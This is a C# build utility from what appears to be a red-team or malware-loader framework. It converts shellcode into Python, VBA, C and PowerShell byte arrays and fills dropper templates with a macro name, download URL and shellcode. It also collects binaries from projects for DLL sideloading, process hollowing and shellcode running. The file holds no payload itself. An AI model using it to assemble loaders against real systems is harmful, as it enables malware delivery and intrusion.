using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;



//I just want the world to know that I wrote this by hand. Then AI told me I sucked and rewrote it better. Then I ruined it again.

//This project builds last, converts shellcode syntax, populates templates, and moves all the artifacts to a unified location.

namespace Build
{
    internal class Entry
    {

        


        private static int Main(string[] args)
        {
            BuildTemplates(args);

            if (args.Length < 1 || string.IsNullOrWhiteSpace(args[0]))
            {
                Console.Error.WriteLine("Missing solution directory argument.");
                return 1;
            }

            ConsolidateArtifacts(args);

            BuildTemplates(args);



            return 0;
        }

        public static string ConvertByteCode(byte[] shellcode, ByteCodeLang bcl)
        {
            StringBuilder sb = new StringBuilder();

            string varname = CONFIG.SHELLCODE_NAME;
            int width = 30;
            int count = 0;

            if (bcl == ByteCodeLang.python)
            {
                sb.Append($"{varname} = b\"\"\n");

            } else if (bcl == ByteCodeLang.vba) {
                sb.Append($"{varname} = Array(");

            }
            else if (bcl == ByteCodeLang.c)
            {
                sb.Append($"unsigned char {varname}[] = \n");

            }
            else if (bcl == ByteCodeLang.ps1)
            {
                sb.Append($"[Byte[]] ${varname} = ");

            }


            foreach (byte b in shellcode)
            {
                //Write newline prefix if new line
                if (count == 0)
                {
                    if (bcl == ByteCodeLang.python)
                    {
                        sb.Append($"{varname} += b\"");

                    }
                    else if (bcl == ByteCodeLang.c)
                    {
                        sb.Append($"\"");

                    }
                }

                //write bytes formatted
                if (bcl == ByteCodeLang.python)
                {
                    sb.Append($"\\x{b.ToString("x2")}");

                }
                else if (bcl == ByteCodeLang.vba)
                {
                    sb.Append($"{(int)b},");

                }
                else if (bcl == ByteCodeLang.c)
                {
                    sb.Append($"\\x{b.ToString("x2")}");

                }
                else if (bcl == ByteCodeLang.ps1)
                {
                    sb.Append($"0x{b.ToString("x2")},");

                }


                //deal with max line width.
                if (count == width)
                {
                    if (bcl == ByteCodeLang.python)
                    {
                        sb.Append($"\"\n");
                    }
                    else if (bcl == ByteCodeLang.c)
                    {
                        sb.Append($"\"\n");

                    }


                    count = 0;
                    continue;
                }

                count++;

            }

            //write last line closure
            if (bcl == ByteCodeLang.python)
            {
                sb.Append($"\"\n");
            }
            else if (bcl == ByteCodeLang.vba)
            {
                string sbt = sb.ToString().TrimEnd(',');
                sb.Clear();
                sb.Append(sbt);
                sb.Append($")");

            }
            else if (bcl == ByteCodeLang.c)
            {
                sb.Append($"\"");

            }
            else if (bcl == ByteCodeLang.ps1)
            {
                string sbt = sb.ToString().TrimEnd(',');
                sb.Clear();
                sb.Append(sbt);
                sb.Append($"");

            }


            return sb.ToString();
        }

        public static void ConsolidateArtifacts(string[] args)
        {
            string baseDir = Path.GetFullPath(args[0]);
            string artifactsDir = Path.Combine(baseDir, "artifacts");

            Dictionary<string, string> projects = new Dictionary<string, string>
            {
                [Path.Combine(baseDir, "DLL Shellcode - Invokable")] = "Shellcode_Invokable",
                [Path.Combine(baseDir, "DLL Sideload Proxy")] = "Shellcode_Auto",
                [Path.Combine(baseDir, "EXE Hollow Process")] = "Hollow",
                [Path.Combine(baseDir, "EXE Shellcode Runner")] = "Shellcode"
            };

            Dictionary<string, string> architectures = new Dictionary<string, string>
            {
                ["x64"] = "x64",
                ["Win32"] = "x86"
            };

            try
            {
                Console.WriteLine("Beginning artifact aggregation...");

                if (Directory.Exists(artifactsDir))
                {
                    Directory.Delete(artifactsDir, recursive: true);
                }

                Directory.CreateDirectory(Path.Combine(artifactsDir, "x64"));
                Directory.CreateDirectory(Path.Combine(artifactsDir, "x86"));

                foreach (KeyValuePair<string, string> project in projects)
                {
                    foreach (KeyValuePair<string, string> architecture in architectures)
                    {
                        CopyArtifact(
                            projectDirectory: project.Key,
                            sourceArchitecture: architecture.Key,
                            destinationArchitecture: architecture.Value,
                            outputName: project.Value,
                            extension: ".dll",
                            artifactsDirectory: artifactsDir);

                        CopyArtifact(
                            projectDirectory: project.Key,
                            sourceArchitecture: architecture.Key,
                            destinationArchitecture: architecture.Value,
                            outputName: project.Value,
                            extension: ".exe",
                            artifactsDirectory: artifactsDir);
                    }
                }

                Console.WriteLine($"Artifacts written to: {artifactsDir}");

            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"Artifact aggregation failed: {ex.Message}");
            }
        }

        private static void CopyArtifact(string projectDirectory, string sourceArchitecture, string destinationArchitecture, string outputName, string extension, string artifactsDirectory)
        {
            string source = Path.Combine(
                projectDirectory,
                "bin",
                sourceArchitecture,
                "Release",
                $"result{extension}");

            if (!File.Exists(source))
            {
                Console.WriteLine($"Skipped missing artifact: {source}");
                return;
            }

            string destination = Path.Combine(
                artifactsDirectory,
                destinationArchitecture,
                $"{outputName}{extension}");

            File.Copy(source, destination, overwrite: true);

            Console.WriteLine($"Copied: {source} -> {destination}");
        }
    
        public enum ByteCodeLang
        {
            vba,
            c,
            ps1,
            python

        }

        private static void BuildTemplates(string[] args)
        {
            if (!Directory.Exists($"{args[0]}\\Artifacts"))
            {
                Directory.CreateDirectory($"{args[0]}\\Artifacts");
            }

            string[] files = Directory.GetFiles($"{args[0]}\\Templates");
            foreach (string f in files)
            {
                FileInfo fi = new FileInfo(f);
                string text = File.ReadAllText(fi.FullName);

                text = text.Replace("{MACRO_NAME}", CONFIG.MACRO_NAME);
                text = text.Replace("{HTTP_URL}", CONFIG.HTTP_URL);
                text = text.Replace("{BINARY_NAME}", CONFIG.BINARY_NAME);
                text = text.Replace("{WAIT_TIME_SECONDS}", CONFIG.WAIT_TIME_SECONDS);
                text = text.Replace("{POWERSHELL_SCRIPT_NAME}", CONFIG.POWERSHELL_SCRIPT_NAME);
                text = text.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);


                //Convert shellcode strings to appropriate language
                if (fi.Extension == ".ps1")
                {
                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.ps1));
                } else if (fi.Extension == ".vba") 
                {
                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.vba));
                } else if (fi.Extension == ".py")
                {
                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.python));
                } else if (fi.Extension == ".c" || fi.Extension == ".cpp" || fi.Extension == ".h" || fi.Extension == ".hpp") 
                {
                    text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.c));
                }

                //Write to artifacts folder
                string nf = f.Replace("Templates", "Artifacts");
                File.WriteAllText(nf, text);
            }

        }
    
    }
}